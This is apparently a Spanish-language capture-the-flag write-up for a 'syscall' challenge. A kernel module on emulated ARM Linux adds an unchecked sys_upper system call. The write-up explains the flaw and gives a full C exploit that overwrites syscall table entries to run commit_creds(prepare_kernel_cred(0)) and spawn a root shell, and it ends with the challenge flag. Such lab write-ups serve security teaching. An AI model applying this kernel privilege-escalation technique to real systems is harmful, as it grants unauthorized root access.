# syscall

<img width="125" height="172" alt="syscall" src="https://github.com/user-attachments/assets/8aab7713-131d-4637-a907-03d46d0b9f78" />

``` C
// adding a new system call : sys_upper

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/vmalloc.h>
#include <linux/mm.h>
#include <asm/unistd.h>
#include <asm/page.h>
#include <linux/syscalls.h>

#define SYS_CALL_TABLE          0x8000e348              // manually configure this address!!
#define NR_SYS_UNUSED           223

//Pointers to re-mapped writable pages
unsigned int** sct;

asmlinkage long sys_upper(char *in, char* out){
        int len = strlen(in);
        int i;
        for(i=0; i<len; i++){
                if(in[i]>=0x61 && in[i]<=0x7a){
                        out[i] = in[i] - 0x20;
                }
                else{
                        out[i] = in[i];
                }
        }
        return 0;
}

static int __init initmodule(void ){
        sct = (unsigned int**)SYS_CALL_TABLE;
        sct[NR_SYS_UNUSED] = sys_upper;
        printk("sys_upper(number : 223) is added\n");
        return 0;
}

static void __exit exitmodule(void ){
        return;
}

module_init( initmodule );
module_exit( exitmodule );
```

Nos meten en una Linux-ARM7 virtualizado de QEMU:
```
sys_upper(number : 223) is added
cttyhack: can't open '/dev/ttyS0': No such file or directory
sh: can't access tty; job control turned off
/ $ uname -a
Linux (none) 3.11.4 #13 SMP Fri Jul 11 00:48:31 PDT 2014 armv7l GNU/Linux
/ $ id
uid=1000 gid=1000 groups=1000
/ $ ls
bin         dev         lib         lost+found  proc        sbin        tmp
boot        etc         linuxrc     m.ko        root        sys         usr
/ $
```

`m.ko` es el modulo agregado por el autor con la syscall 223 `sys_upper`. Esta syscall no tiene sanitizacion de entrada y basicamente escribe el contenido de `in` en `out`, solo cambiando un rango de caracteres ascii (las minusculas):
``` C
    for(i=0; i<len; i++){
                if(in[i]>=0x61 && in[i]<=0x7a){
                        out[i] = in[i] - 0x20;
                }
                else{
                        out[i] = in[i];
                }
        }
```

## Corrompiendo SYSCALL_TABLE

LLamando a `commit_creds(prepare_kernel_cred(0))` se pueden ganar privilegios de administrador para el proceso actual:
- `prepare_kernel_cred(uint id)` devuelve un puntero a una estructura `cred` que contiene las credenciales para una nueva tarea. El parametro `0` es el ID de root.
- `commit_creds(struct cred *new)` actualiza las credenciales de la tarea actual con las nuevas credenciales proporcionadas. 

Con `/proc/kallsyms` podemos observar los simbolos del kernel y sus direcciones de memoria. Por lo visto tenemos permiso de lectura:
```
/ $ ls -l /proc/kallsyms
-r--r--r--    1 0        0                0 Aug 29 22:49 /proc/kallsyms
```

La estrategia se resume en hallar dos punteros a syscalls en la `SYSCALL_TABLE` `sys_1` y `sys_2` que tomen solo un parametro tal que podamos reemplazar:
`sys_1` => `commit_creds`, `sys_2` => `prepare_kernel_cred` y entonces `sys_1(sys_2(0))`. Despues con maximos privilegios invocar una shell: `system("/bin/sh"`).

Lamentablemente `commit_creds` contiene el byte `0x6c`, asi que no podemos usar esta direccion directamente, pero podemos reemplazar este byte por `0x60` y en esa direccion escribir 12 bytes de instrucciones NOP como `mov reg,reg`.

## Exploit
``` C
#include <stdlib.h>
#include <unistd.h>

#define SYS_CALL_TABLE		0x8000e348
#define SYS_UPPER     		223
#define SYS_STIME     		25
#define SYS_TIME     		  13

#define PREPARE_KERNEL_CRED "\x24\xf9\x03\x80"
#define COMMIT_CREDS_MINUS_12 "\x60\xf5\x03\x80"

int main(){
  unsigned int** sct=(unsigned int**)SYS_CALL_TABLE;
   

   // Write in [commit_creds - 12] 12 bytes of some kind of NOP (mov r8,r8)
   syscall(SYS_UPPER,"\x08\x80\xa0\xe1\x08\x80\xa0\xe1\x08\x80\xa0\xe1",0x8003f560); 

   // Replace sys_stime with commit_creds -12
   syscall(SYS_UPPER,COMMIT_CREDS_MINUS_12,&sct[SYS_STIME]);

   // Replace sys_time with prepare_kernel_cred
   syscall(SYS_UPPER,PREPARE_KERNEL_CRED,&sct[SYS_TIME]);

   // Execute commit_creds(prepare_kernel_cred(0))
   syscall(SYS_STIME,syscall(SYS_TIME,0));

   // Shell
   system("/bin/sh");
   return 0;
}
```

`Must_san1tize_Us3r_p0int3r`

